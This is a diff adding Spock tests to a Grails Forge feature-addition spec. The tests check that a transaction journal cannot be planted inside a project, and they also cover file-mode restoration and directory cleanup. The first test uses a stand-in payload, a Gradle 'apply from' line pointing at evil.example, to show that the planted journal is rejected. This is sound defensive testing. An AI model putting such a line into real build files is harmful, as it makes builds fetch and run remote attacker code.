@@ -698,6 +698,139 @@ class FeatureAdditionSpec extends ApplicationContextSpec {
     }
 
     @IgnoreIf({ os.windows })
+    void "a home directory that is the project, is in it or is a link to it keeps no record: a project could bring one along"() {
+        given: 'a project that has, where its own directory would keep the journals, a journal that names its build file, and a copy to put in its place'
+        ProjectGenerator generator = generator()
+        Path project = create(generator, 'app', [])
+        Path inside = Files.createDirectories(project.resolve('tools/home'))
+        Path link = Files.createSymbolicLink(directory.resolve('link-to-the-project'), project)
+        String path = Base64.urlEncoder.withoutPadding().encodeToString(project.toRealPath().toString().getBytes('UTF-8'))
+        byte[] evil = 'apply from: "https://evil.example/build.gradle"\n'.getBytes('UTF-8')
+        [project, inside].each { Path where ->
+            Path of = Files.createDirectories(where.resolve('.grails/forge/transactions').resolve(sha(project.toRealPath().toString().getBytes('UTF-8'))))
+            Files.writeString(of.resolve('journal'), "grails-forge-transaction 3\nproject ${path}\nid t0123456789abcdef01234567\n" +
+                    "put 0 ${sha(evil)} ${sha(project.resolve('build.gradle'))} build.gradle\nend\n")
+        }
+        Files.createDirectories(project.resolve('.grails/transactions/t0123456789abcdef01234567/backup'))
+        Files.write(project.resolve('.grails/transactions/t0123456789abcdef01234567/backup/0'), evil)
+        Map<String, String> before = tree(project)
+
+        when:
+        new FeatureAddition(generator, chosen.call(project, inside, link)).recover(project)
+
+        then:
+        ProjectChangeException e = thrown()
+        e.message == 'Adding a feature needs a home directory to keep the record of the change in, and the one the system property user.home names cannot be used: ' +
+                'it is the directory of the project, or a directory in it, or a link to one, and the record of a change must not be where a project could bring one along. ' +
+                'Nothing of the project was changed'
+        tree(project) == before
+
+        when: 'what would be done is still worked out, and nothing of the journal is read for it'
+        ChangePlan plan = new FeatureAddition(generator, chosen.call(project, inside, link)).plan(project, [FEATURE], OperatingSystem.LINUX, ConsoleOutput.NOOP)
+
+        then:
+        plan.requested == [FEATURE]
+
+        when:
+        plan.apply()
+
+        then:
+        ProjectChangeException again = thrown()
+        again.message == e.message
+        tree(project) == before
+
+        where:
+        what                     | chosen
+        'the project'            | { Path itself, Path within, Path linked -> itself }
+        'a directory in it'      | { Path itself, Path within, Path linked -> within }
+        'a link to the project'  | { Path itself, Path within, Path linked -> linked }
+        'a directory by a link'  | { Path itself, Path within, Path linked -> linked.resolve('tools/home') }
+    }
+
+    @IgnoreIf({ os.windows })
+    void "a file of which a change only changes the mode is put back when its mode was changed, and not said to be when it was not"() {
+        given:
+        ProjectGenerator generator = generator { GeneratorContext context ->
+            context.addTemplate('tool', new Fixed('tool.sh', '#!/bin/sh\necho tool\n'.bytes, false, context.features.contains(FEATURE)))
+        }
+        Path project = create(generator, 'app', [])
+        Path pristine = copy(project, 'pristine')
+        Map<String, String> before = tree(project)
+
+        when: 'the change ends after its first file, which is then put back by hand: the mode of the script was not changed'
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'README.md') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+        Files.copy(pristine.resolve('README.md'), project.resolve('README.md'), StandardCopyOption.REPLACE_EXISTING)
+        ProjectRecovery recovery = addition(generator).recover(project)
+
+        then:
+        recovery.discarded
+        !recovery.undone
+        recovery.putBack == []
+        tree(project) == before
+        left(project) == []
+
+        when: 'the change ends after it made the script executable'
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'tool.sh') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+
+        then:
+        Files.isExecutable(project.resolve('tool.sh'))
+
+        when:
+        recovery = addition(generator).recover(project)
+
+        then:
+        recovery.undone
+        recovery.putBack.contains('tool.sh')
+        !Files.isExecutable(project.resolve('tool.sh'))
+        tree(project) == before
+    }
+
+    void "the directories a change made are removed with its journal when its files were removed by other means"() {
+        given:
+        ProjectGenerator generator = withNewFiles()
+        Path project = create(generator, 'app', [])
+        Path pristine = copy(project, 'pristine')
+        Map<String, String> before = tree(project)
+        try {
+            planOf(generator, project).apply { String path ->
+                if (path == 'bin/tool.sh') {
+                    throw new Stopped()
+                }
+            }
+        } catch (Stopped ignored) {
+        }
+
+        expect:
+        Files.isDirectory(project.resolve('bin'))
+
+        when: 'the files are what they were, and the directory of the new file is left empty'
+        Files.copy(pristine.resolve('README.md'), project.resolve('README.md'), StandardCopyOption.REPLACE_EXISTING)
+        Files.delete(project.resolve('bin/tool.sh'))
+        ProjectRecovery recovery = addition(generator).recover(project)
+
+        then:
+        recovery.discarded
+        !Files.exists(project.resolve('bin'))
+        tree(project) == before
+        left(project) == []
+        journals() == []
+    }
+
+    @IgnoreIf({ os.windows })
     void "a directory on the way to the journals that others can write, or that is a link, is not used"() {
         given:
         ProjectGenerator generator = generator()
